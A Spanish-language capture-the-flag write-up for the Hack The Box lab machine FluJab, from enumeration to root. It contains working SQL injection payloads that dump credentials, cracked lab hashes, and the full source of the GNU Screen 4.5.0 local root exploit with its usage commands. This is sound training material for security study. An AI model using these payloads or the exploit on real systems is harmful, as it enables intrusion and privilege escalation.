---
layout: post
title: FluJab
date: 2023-02-26
description:
img:
fig-caption:
tags: [eWPT, eWPTXv2, OSWE, OSCP]
---
___

<center><img src="/writeups/assets/img/Flujab-htb/FluJab.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos

* Enumeración Web

* Manipulación de Cookies

* Abuso de SMTP

* Inyección SQL

* Abuso de Ajenti Server

* LFI

* Modificación de permisos con la API

* Bypass firewall por SSH

* Abuso de binario SUID (Escalada de Privilegios)

***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.10.124 -oG openports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-25 08:45 GMT
Nmap scan report for 10.10.10.124
Host is up (0.056s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 14.38 seconds
```

### Escaneo de versión y servicios de cada puerto

```null
nmap -sCV -p22,80,443,8080 10.10.10.124 -oN portscan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-25 08:46 GMT
Nmap scan report for 10.10.10.124
Host is up (0.17s latency).

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh?
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
80/tcp   open  http     nginx
|_http-title: Did not follow redirect to https://10.10.10.124/
|_http-server-header: ClownWare Proxy
443/tcp  open  ssl/http nginx
| ssl-cert: Subject: commonName=ClownWare.htb/organizationName=ClownWare Ltd/stateOrProvinceName=LON/countryName=UK
| Subject Alternative Name: DNS:clownware.htb, DNS:sni147831.clownware.htb, DNS:*.clownware.htb, DNS:proxy.clownware.htb, DNS:console.flujab.htb, DNS:sys.flujab.htb, DNS:smtp.flujab.htb, DNS:vaccine4flu.htb, DNS:bestmedsupply.htb, DNS:custoomercare.megabank.htb, DNS:flowerzrus.htb, DNS:chocolateriver.htb, DNS:meetspinz.htb, DNS:rubberlove.htb, DNS:freeflujab.htb, DNS:flujab.htb
| Not valid before: 2018-11-28T14:57:03
|_Not valid after:  2023-11-27T14:57:03
| tls-nextprotoneg: 
|_  http/1.1
|_http-title: Direct IP access not allowed | ClownWare
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
|_http-server-header: ClownWare Proxy
8080/tcp open  ssl/http nginx
| tls-nextprotoneg: 
|_  http/1.1
|_http-title: 400 The plain HTTP request was sent to HTTPS port
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
|_http-server-header: ClownWare Proxy
| ssl-cert: Subject: commonName=ClownWare.htb/organizationName=ClownWare Ltd/stateOrProvinceName=LON/countryName=UK
| Subject Alternative Name: DNS:clownware.htb, DNS:sni147831.clownware.htb, DNS:*.clownware.htb, DNS:proxy.clownware.htb, DNS:console.flujab.htb, DNS:sys.flujab.htb, DNS:smtp.flujab.htb, DNS:vaccine4flu.htb, DNS:bestmedsupply.htb, DNS:custoomercare.megabank.htb, DNS:flowerzrus.htb, DNS:chocolateriver.htb, DNS:meetspinz.htb, DNS:rubberlove.htb, DNS:freeflujab.htb, DNS:flujab.htb
| Not valid before: 2018-11-28T14:57:03
|_Not valid after:  2023-11-27T14:57:03

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 183.91 seconds
```

Veo muchos dominios y subdominios, que puedo añadir al ```/etc/hosts```

## Puerto 80 (HTTP) | Puerto 443,8080 (HTTPS)

Con whatweb analizo las tecnologías que está empleando el servidor web

```null
whatweb http://10.10.10.124
http://10.10.10.124 [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[ClownWare Proxy], IP[10.10.10.124], RedirectLocation[https://10.10.10.124/], Title[301 Moved Permanently]
https://10.10.10.124/ [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[ClownWare Proxy], IP[10.10.10.124], Script[text/javascript], Title[Direct IP access not allowed | ClownWare], X-UA-Compatible[IE=Edge]

whatweb https://10.10.10.124
https://10.10.10.124 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[ClownWare Proxy], IP[10.10.10.124], Script[text/javascript], Title[Direct IP access not allowed | ClownWare], X-UA-Compatible[IE=Edge]
```

```null
whatweb https://10.10.10.124:8080
https://10.10.10.124:8080 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[ClownWare Proxy], IP[10.10.10.124], Script[text/javascript], Title[Direct IP access not allowed | ClownWare], X-UA-Compatible[IE=Edge]
```

Por ahora, mi IP no tiene acceso a estos recursos

Tramito una petición por GET a cada subdominio

```null
cat data | while read domain; do echo -e "\n[+] Dominio $domain"; curl -s -X GET https://$domain -k | html2text; done

[+] Dominio clownware.htb

Please enable cookies.
****** Error 1003 Ray ID: 627e0c73b55d65e6 • 2023-02-25 08:55:23 GMT ******
***** Direct IP access not allowed *****
***** What happened? *****
You've requested an IP address that is part of the ClownWare network. A valid
Host header must be supplied to reach the desired website.
***** What can I do? *****
If you are interested in learning more about ClownWare, please visit_our
website.
ClownWare Ray ID: af056cd0453685e6 • Your IP: 10.10.16.7 • Performance &
security by ClownWare

[+] Dominio sni147831.clownware.htb

Please enable cookies.
****** Error 1003 Ray ID: acd775fe7e80f918 • 2023-02-25 08:55:26 GMT ******
***** Direct IP access not allowed *****
***** What happened? *****
You've requested an IP address that is part of the ClownWare network. A valid
Host header must be supplied to reach the desired website.
***** What can I do? *****
If you are interested in learning more about ClownWare, please visit_our
website.
ClownWare Ray ID: 9a0c9493e17c286d • Your IP: 10.10.16.7 • Performance &
security by ClownWare

[+] Dominio proxy.clownware.htb

Please enable cookies.
****** Error 1003 Ray ID: 371eb83dc7cfd712 • 2023-02-25 08:55:27 GMT ******
***** Direct IP access not allowed *****
***** What happened? *****
You've requested an IP address that is part of the ClownWare network. A valid
Host header must be supplied to reach the desired website.
***** What can I do? *****
If you are interested in learning more about ClownWare, please visit_our
website.
ClownWare Ray ID: ac512359ad32d443 • Your IP: 10.10.16.7 • Performance &
security by ClownWare

[+] Dominio console.flujab.htb
                                [/console.gif]

[+] Dominio sys.flujab.htb

Please enable cookies.
****** Error 1003 Ray ID: 841af9aa6005b583 • 2023-02-25 08:55:31 GMT ******
***** Direct IP access not allowed *****
***** What happened? *****
You've requested an IP address that is part of the ClownWare network. A valid
Host header must be supplied to reach the desired website.
***** What can I do? *****
If you are interested in learning more about ClownWare, please visit_our
website.
ClownWare Ray ID: 116fd8bd7efa72dd • Your IP: 10.10.16.7 • Performance &
security by ClownWare

[+] Dominio smtp.flujab.htb

****** SMTP_Mail_Configuration ******

***** Log in here for your Mail-in-a-Box control panel. *****
Email
[Unknown INPUT type]
Password
[********************]
Sign in

[+] Dominio vaccine4flu.htb
  [/getvacc.gif] [/getvacc.gif] [/getvacc.gif] [/getvacc.gif] [/getvacc.gif]

[+] Dominio bestmedsupply.htb

[Mens_Health_-_online_pharmacy]
    * About_Us
    * Terms_and_Conditions
    * Privacy_Policy
**** Shop by Category ****
    * ADHD
    * Mens_Health
    * Anti_Anxiety
    * Pain_Killers
[Search our store  ]
Advanced_Search
**** Best Sellers ****
   1. Buy_Tramadol_100mg_online_no_prescription
   2. Buy_Soma_350mg_Online
   3. Buy_Adderall_30mg_online
   4. Buy_Soma_500mg_online
   5. Buy_Oxycodone_40mg_Online
   6. Buy_Ritalin_(Methylphenidate)_10mg_Online
    * Home
    * Mens_Health
****** Mens Health ******
  Sort by [One of: -- Please Select --/Name (Z-A)/Name (A-Z)/Date Added (Newest
First)/Date Added (Oldest First)/Price (High-Low)/Price (Low-High)] [Sort]
[Buy_Cialis_(Tadalifil_Citrate)_40mg_Online]
Buy_Cialis_(Tadalifil_Citrate)…
$1.25
Info  [Buy]
[Buy_Generic_cialis_20_mg_online_(Tadalifil_Citrate)_20mg__online]
Buy_Generic_cialis_20_mg_online…
$0.90
Info  [Buy]
[Buy_Levitra_(Vardenafil)_10_mg_online]
Buy_Levitra_(Vardenafil)_10_mg_online
$1.10
Info  [Buy]
[Buy_Ritalin_(Methylphenidate)_10mg_Online]
Buy_Ritalin_(Methylphenidate)…
$0.95
Info  [Buy]
[Buy_Viagra_(Sildenafil_Citrate)_100mg_Online]
Buy_Viagra_(Sildenafil_Citrate)…
$0.75
Info  [Buy]
[Buy_Viagra_(Sildenafil_Citrate)_200mg]
Buy_Viagra_(Sildenafil_Citrate)_200mg
$0.85
Info  [Buy]
  Sort by [One of: -- Please Select --/Name (Z-A)/Name (A-Z)/Date Added (Newest
First)/Date Added (Oldest First)/Price (High-Low)/Price (Low-High)] [Sort]
Log_In or Register

**** Your Shopping Basket ****
Your basket is empty.
Total:  $0.00
View_Basket
**** Featured Product ****
[Buy_Oxycodone_40mg_Online]
Buy_Oxycodone_40mg_Online
$1.75
 [Buy now]
**** Mailing List ****
Enter your e-mail address to receive our newsletter
[Email             ] [Subscribe]
 [One of: English (UK)/English (US)] [Submit]
 [One of: $ USD/¥ JPY/£ GBP/$ CAD/€ EUR/$ AUD] [Submit]


[+] Dominio custoomercare.megabank.htb
                                [/warning.png]

[+] Dominio flowerzrus.htb


    * home_page
    * about_us
    * bouquets
    * specials
    * contacts
Nam eu nulla. Donec lobortis purus vel urna. Nunc laoreet lacinia nunc.
Nam eu nulla. Donec lobortis purus vel urna. Nunc laoreet lacinia nunc. In
volutpat sodales ipsum. Sed vestibulum. Integer in ante. Sed Nunc laoreet
lacinia nunc. In volutpat sodales
Nam eu nulla. Donec lobortis purus vel urna. Nunc laoreet lacinia nunc.Nam eu
nulla. Donec lobortis purus vel urna. Nunc laoreet lacinia nunc. In volutpat
sodales ipsum.
Morbi volutpat leo in
Nam_eu_nulla._Donec
lobortis purus vel urna. Nunc laoreet lacinia nunc
Morbi volutpat leo in
Nam_eu_nulla._Donec
lobortis purus vel urna. Nunc laoreet lacinia nunc
Morbi volutpat leo in
Nam_eu_nulla._Donec
lobortis purus vel urna. Nunc laoreet lacinia nunc
HOME_PAGE | ABOUT_US | BOUTQUETS | SPECIALS | NEWS | CONTACTS
Copyright © Your Company Name | Design by Website_Templates
             This template downloaded form free_website_templates

[+] Dominio chocolateriver.htb
                   Your browser does not support HTML5 video.

[+] Dominio meetspinz.htb
                                [/meatspin.gif]

[+] Dominio rubberlove.htb
                   Your browser does not support HTML5 video.

[+] Dominio freeflujab.htb

****** Winter_Is_Coming... ******
****** Book Your Free NHS Flu Jab Today! ******

    * Home
    * Patients
          o Register
          o Booking
          o Cancelation
          o Reminder
Vaccine_Info
Flu_Stats


Vaccinations

***** Getting The Flu Jab *****
**** Flu vaccination is available every year on the NHS to help protect adults
and children at risk of flu and its complications. ****

***** The flu vaccine *****
Flu can be unpleasant, but if you are otherwise healthy it will usually clear
up on its own within a week. However, flu can be more severe in certain people,
such as:
    * anyone aged 65 and over
    * pregnant women
    * children and adults with an underlying health condition (such as long-
      term heart or respiratory disease)
    * children and adults with weakened immune systems
Anyone in these risk groups is more likely to develop potentially serious
complications of flu, such as pneumonia (a lung infection), so it is now
recommended that they have a flu vaccine every year to help protect them.
***** Who should get the flu vaccine? *****
The flu vaccine is routinely given on the NHS to:
    * adults 65 and over
    * people with certain medical conditions (including children in at-risk
      groups from 6 months of age)
    * pregnant women
    * children aged 2 and 3
    * children in reception class and school years 1, 2, 3, 4 and 5
**** For 2018, there are 3 types of flu vaccine: ****
1. a live quadrivalent vaccine (which protects against 4 strains of flu), given
as a nasal spray. This is for children and young people aged 2 to 17 years
eligible for the flu vaccine
2. a quadrivalent injected vaccine. This is for adults aged 18 and over but
below the age of 65 who are at increased risk from flu because of a long-term
health condition and for children 6 months and above in an eligible group who
cannot receive the live vaccine
3. an adjuvanted trivalent injected vaccine. This is for people aged 65 and
over as it has been shown to be more effective in this age group

***** Young Children *****

If your child is aged between 6 months and 2 years old and is in a high-risk
group for flu, they will be offered an injected flu vaccine as the nasal spray
is not licensed for children under 2.
More

***** How effective is the flu vaccine? *****

Flu vaccine is the best protection we have against an unpredictable virus that
can cause unpleasant illness in children and severe illness and death among at-
risk groups, including older people, pregnant women and those with an
underlying medical health condition.
More

    * © 3mrgnc3
    * FreeFluJab.htb
    * Protected_By_ClownWare.htb

[+] Dominio flujab.htb

Please enable cookies.
****** Error 1003 Ray ID: a06e8887cfff986d • 2023-02-25 08:55:41 GMT ******
***** Direct IP access not allowed *****
***** What happened? *****
You've requested an IP address that is part of the ClownWare network. A valid
Host header must be supplied to reach the desired website.
***** What can I do? *****
If you are interested in learning more about ClownWare, please visit_our
website.
ClownWare Ray ID: 253c96625c4874f3 • Your IP: 10.10.16.7 • Performance &
security by ClownWare
```


Un subdominio se encarga de gestionar los correos

<img src="/writeups/assets/img/Flujab-htb/1.png" alt="">

Pero al probar a iniciar sesión, las credenciales viajan por GET, así que lo más probable es que no esté funcional

<img src="/writeups/assets/img/Flujab-htb/2.png" alt="">

Otro subdominio aloja una tienda online

<img src="/writeups/assets/img/Flujab-htb/3.png" alt="">

Tampoco tiene nada interesante. En otro, si que me puedo registrar

<img src="/writeups/assets/img/Flujab-htb/4.png" alt="">

Necesito un identificador válido

<img src="/writeups/assets/img/Flujab-htb/5.png" alt="">

Utilizo el que viene de ejemplo (NHS-012-345-6789). El número de télefono también tiene que estar adecuado al formato (01234 567890). Al registrarme, me aparece una ventana emergente

<img src="/writeups/assets/img/Flujab-htb/6.png" alt="">

Me dirijo a la sección de reserva

<img src="/writeups/assets/img/Flujab-htb/7.png" alt="">

Ahora la advertincia dice que este usuario no existe

<img src="/writeups/assets/img/Flujab-htb/8.png" alt="">

Estoy arrastrando una cookie con el siguiente valor:

<img src="/writeups/assets/img/Flujab-htb/9.png" alt="">

En el ```BurpSuite```, añado un scope para filtrar datos únicamente por el dominio actual

<img src="/writeups/assets/img/Flujab-htb/10.png" alt="">

En el ```site-map```, puedo ver como está estructurada la web

<img src="/writeups/assets/img/Flujab-htb/11.png" alt="">

Veo otra cookie

<img src="/writeups/assets/img/Flujab-htb/12.png" alt="">

La modifico por un ```True```

<img src="/writeups/assets/img/Flujab-htb/13.png" alt="">

Puedo acceder a la página de cancelación

<img src="/writeups/assets/img/Flujab-htb/14.png" alt="">

Pero sigo teniendo el mismo problema con el SMTP. Sin embargo, al settear al cookie, se está leakeando una ruta de la web

<img src="/writeups/assets/img/Flujab-htb/15.png" alt="">

<img src="/writeups/assets/img/Flujab-htb/16.png" alt="">

Puedo intentar crear yo mi servidor de correo para que las peticiones viajen a mí. De primeras no deja avanzar por el patrón

<img src="/writeups/assets/img/Flujab-htb/17.png" alt="">

Pero se puede borrar la etiqueta para forzar el envío. Me pongo en escucha por el puerto 25, y al realizar todo el procedimiento e antes recibo la conexión

```null
nc -nlvp 25
listening on [any] 25 ...
connect to [10.10.16.8] from (UNKNOWN) [10.10.10.124] 36638
```

Monto el servidor con python

```null
python3.11 -m smtpd -c DebuggingServer 10.10.16.8:25 2>/dev/null
---------- MESSAGE FOLLOWS ----------
b'Date: Mon, 27 Feb 2023 08:33:34 +0000'
b'To: cancelations@no-reply.flujab.htb'
b'From: Nurse Julie Walters <DutyNurse@flujab.htb>'
b'Subject: Flu Jab Appointment - Ref:'
b'Message-ID: <79511aa4f0c256a04a73798703b02506@freeflujab.htb>'
b'X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)'
b'MIME-Version: 1.0'
b'Content-Type: text/plain; charset=iso-8859-1'
b'X-Peer: 10.10.10.124'
b''
b'    CANCELLATION NOTICE!'
b'  ________________________'
b'    '
b'    VACCINATION'
b'    Routine Priority'
b'    ------------------'
b'    REF    : NHS-123-456-7890    '
b'    Code   : Influ-022'
b'    Type   : Injection'
b'    Stat   : CANCELED '
b'    LOC    : Crick026 '
b'  ________________________'
b''
b'  Your flu jab appointment has been canceled.'
b'  Have a nice day,'
b''
b'  Nurse Julie Walters'
b'  Senior Staff Nurse'
b'  Cricklestone Doctors Surgery'
b'  NHS England.'
b'  '
------------ END MESSAGE ------------
```

Una sección de la web contenía nombres de clientes, que puede darse el caso de que hayan sido registrados

<img src="/writeups/assets/img/Flujab-htb/18.png" alt="">

Utilizo el ```Intruder``` de ```BurpSuite``` para aplicar fuerza bruta utilizando un diccionario de usuarios de ```SecLists```. Hasta que llega a Bob, que es válido

<img src="/writeups/assets/img/Flujab-htb/19.png" alt="">

```null
python3.11 -m smtpd -c DebuggingServer 10.10.16.8:25 2>/dev/null
---------- MESSAGE FOLLOWS ----------
b'Date: Mon, 27 Feb 2023 08:59:26 +0000'
b'To: bobsmith1975@gmail.com'
b'From: Nurse Julie <DutyNurse@flujab.htb>'
b'Subject: Flu Jab Appointment - Ref:NHS-943-475-5911'
b'Message-ID: <6521b33c9545fc2ac42ff31905eec735@freeflujab.htb>'
b'X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)'
b'MIME-Version: 1.0'
b'Content-Type: text/plain; charset=iso-8859-1'
b'X-Peer: 10.10.10.124'
b''
b''
b'  '
b'  Dear Mr bob Smith,'
b''
b'  Here are the details of your appointment at our surgery.'
b'  ________________________'
b'    '
b'    VACCINATION'
b'    Routine Priority'
b'    ------------------    '
b'    REF    : NHS-943-475-5911'
b'    Code   : Influ-022'
b'    Type   : Injection'
b'    Time   : 09:00'
b'    Date   : 2018-11-30'
b'    LOC    : Crick026 '
b'  ________________________'
b''
b'  We look forward to seeing you.'
b'  Have a nice day,'
b''
b'  Nurse Julie Walters'
b'  Senior Staff Nurse'
b'  Cricklestone Doctors Surgery'
b'  NHS England.'
b'  '
------------ END MESSAGE ------------
```

Ese campo es vulnerable a inyección SQL. Tiene un total de 5 columnas

<img src="/writeups/assets/img/Flujab-htb/20.png" alt="">

En la respuesta por SMTP puedo ver un campo la data filtrada

```null
nhsnum='+union+select+1,2,database(),4,5--+-&submit=Cancel+Appointment
```

```null
b'Subject: Flu Jab Appointment - Ref:vaccinations'
```

Listo todas las bases de datos

```null
nhsnum='+union+select+1,2,group_concat(schema_name),4,5+from+information_schema.schemata--+-&submit=Cancel+Appointment
```

```null
b'Subject: Flu Jab Appointment - Ref:MedStaff,information_schema,mysql,openmrs,performance_schema,phplist,vaccinations'
```

Para la base de datos ```vaccinations```, enumero las columnas de la tabla ```admin```

```null
nhsnum='+union+select+1,2,group_concat(table_name),4,5+from+information_schema.tables+where+table_schema%3d'vaccinations'--+-&submit=Cancel+Appointment
```

```null
b'Subject: Flu Jab Appointment - Ref:admin,admin_attribute,admin_password_request,adminattribute,admintoken,attachment,attribute,bounce,bounceregex,bounceregex_bounce,config,eventlog,i18n,linktrack,linktrack_forward,linktrack_ml,linktrack_uml_click,linktrack_userclick,list,listmessage,listuser,message,message_attachment,messagedata,sendprocess,subscribepage,subscribepage_data,template,templateimage,urlcache,user,user_attribute,user_blacklist,user_blacklist_data,user_history,user_message_bounce,user_message_forward,user_message_view,usermessage,userstats'
```

```null
nhsnum='union+select+1,2,group_concat(column_name),4,5+from+information_schema.columns+where+table_schema%3d'vaccinations'+and+table_name%3d'admin'--+-&submit=Cancel+Appointment
```

```null
b'Subject: Flu Jab Appointment - Ref:id,loginname,namelc,email,access,created,modified,modifiedby,password,passwordchanged,superuser,disabled,privileges'
```

Seleciono los correos, con los usuarios y contraseñas

```null
nhsnum='union+select+1,2,group_concat(email,':',loginname,':',password),4,5+from+admin--+-&submit=Cancel+Appointment
```

```null
b'Subject: Flu Jab Appointment - Ref:syadmin@flujab.htb:sysadm:a3e30cce47580888f1f185798aca22ff10be617f4a982d67643bb56448508602'
```

Pruebo a crackear el hash con ```hascat```

```null
hashcat -m 1400 hash /usr/share/wordlists/rockyou.txt --show
a3e30cce47580888f1f185798aca22ff10be617f4a982d67643bb56448508602:th3doct0r
```

No me puedo conectar por SSH

```null
ssh sysadm@10.10.10.124
kex_exchange_identification: read: Connection reset by peer
Connection reset by 10.10.10.124 port 22
```

En la anterior tabla había una columna llamada ```access```

```null
nhsnum='union+select+1,2,group_concat(access),4,5+from+admin--+-&submit=Cancel+Appointment
```

```null
b'Subject: Flu Jab Appointment - Ref:sysadmin-console-01.flujab.htb'
```

Agrego este nuevo subdominio al ```/etc/hosts```. Es válido por el puerto 8080

<img src="/writeups/assets/img/Flujab-htb/21.png" alt="">

Puedo acceder a la interfaz con las credenciales de antes

<img src="/writeups/assets/img/Flujab-htb/22.png" alt="">

Dentro hay un editor de archivos, de los cuales puedo abrir de la máquina víctima

<img src="/writeups/assets/img/Flujab-htb/23.png" alt="">

En ```/home/drno/.ssh/userkey``` hay una id_rsa encriptada. La crackeo con ```john```

```null
ssh2john id_rsa > hash
```
```null
john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
shadowtroll      (id_rsa)     
1g 0:00:00:00 DONE (2023-02-27 16:11) 2.040g/s 2647Kp/s 2647Kc/s 2647KC/s shadu..shadowtroll
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

A pesar de ello, sigo sin poder ganar acceso por SSH

```null
ssh drno@10.10.10.124 -i id_rsa
kex_exchange_identification: read: Connection reset by peer
Connection reset by 10.10.10.124 port 22
```

En el archivo de configuración ```/etc/ssh/sshd_config``` se puede ver que en caso de crear un archivo con nombre ```access``` en el directorio personal de un usuario, es válida la conexión

```null
# Expect .ssh/authorized_keys2 to be disregarded by default in future.
AuthorizedKeysFile	.ssh/authorized_keys access
```

Añado mi IP a la whitelist en ```/etc/hosts.allow```

```null
sshd: 10.10.16.9
sshd: 127.0.0.1
```

Tampoco tengo acceso

```null
ssh drno@10.10.10.124 -i id_rsa
The authenticity of host '10.10.10.124 (10.10.10.124)' can't be established.
ED25519 key fingerprint is SHA256:DI5pLQ22nYlC140XgwyLNkRXIisiKpcqqXJ0cUncHjI.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.124' (ED25519) to the list of known hosts.
Enter passphrase for key 'id_rsa': 
drno@10.10.10.124: Permission denied (publickey).
```

Como estoy conectado como ```sysadm```, puedo añadir en su directorio personal un achivo ```access``` con mi clave pública. Hay que asignarale un permiso válido utilizando la API

<img src="/writeups/assets/img/Flujab-htb/24.png" alt="">

Gano acceso como ```sysadm```

```null
ssh sysadm@10.10.10.124
Linux flujab 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
sysadm@flujab:~$
```

Estoy dentro de una ```restricted bash```

```null
sysadm@flujab:~$ cd ..
-rbash: cd: restricted
```

Para evitarlo, puedo ejecutar el comando con ssh para spawnear una ```bash```

```null
ssh sysadm@10.10.10.124 bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
sysadm@flujab:~$ ^Z
zsh: suspended  ssh sysadm@10.10.10.124 bash
❯ stty raw -echo; fg
[1]  + continued  ssh sysadm@10.10.10.124 bash
                                              reset xterm
sysadm@flujab:~$ export TERM=xterm
sysadm@flujab:~$ export SHELL=bash
sysadm@flujab:~$ stty rows 55 columns 209
```

# Escalada

El binario ```screen``` es SUID

```null
sysadm@flujab:/$ find \-perm \-4000 2>/dev/null 
./usr/lib/openssh/ssh-keysign
./usr/lib/dbus-1.0/dbus-daemon-launch-helper
./usr/lib/eject/dmcrypt-get-device
./usr/local/share/screen/screen
./usr/bin/chsh
./usr/bin/newgrp
./usr/bin/passwd
./usr/bin/chfn
./usr/bin/screen
./usr/bin/gpasswd
./usr/bin/sudo
./bin/su
./bin/umount
./bin/mount
./bin/ping
./bin/fusermount
```

```null
sysadm@flujab:/$ screen --version
Screen version 4.05.00 (GNU) 10-Dec-16
```

Existe un exploit público para esta versión

```null
searchsploit GNU screen | grep -i privilege
GNU C Library 2.x (libc6) - Dynamic Linker LD_AUDIT Arbitrary DSO Load Privilege Escalation                                                                                    | linux/local/15304.txt
GNU Screen 4.5.0 - Local Privilege Escalation                                                                                                                                  | linux/local/41154.sh
GNU Screen 4.5.0 - Local Privilege Escalation (PoC)                                                                                                                            | linux/local/41152.txt
```

Como la máquina no tiene ```gcc```, lo compilo en local para subirlo

Archivo ```libhax.c```:

```null
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
```

Archivo ```rootshell.c```:

```null
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
```

```null
gcc -fPIC -shared -ldl -o libhax.so libhax.c
```

```null
gcc -o rootshell rootshell.c
```

Al ejecutarlo, me sale una advertiencia debido a una falta de permisos

```null
sysadm@flujab:/etc$ screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so"
Directory '/run/screen' must have mode 755.
```

Sin embargo, hay dos binarios ```screen```

```null
sysadm@flujab:/$ find \-perm \-4000 2>/dev/null | grep screen
./usr/local/share/screen/screen
./usr/bin/screen
```

Para el que se encuentra en ```/usr/local```, no hay ningún problema

```null
sysadm@flujab:/tmp$ cd /etc
sysadm@flujab:/etc$ umask 000
sysadm@flujab:/etc$ /usr/local/share/screen/screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so"
sysadm@flujab:/etc$ /usr/local/share/screen/screen -ls
' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
[+] done!
No Sockets found in /tmp/screens/S-sysadm.
```

Ahora el propietario es ```root``` y como es SUID puedo ganar acceso como este usuario

```null
sysadm@flujab:/tmp$ ls -la rootshell 
-rwsr-xr-x 1 root root 16168 Feb 27 16:53 rootshell
```

Puedo ver las dos flags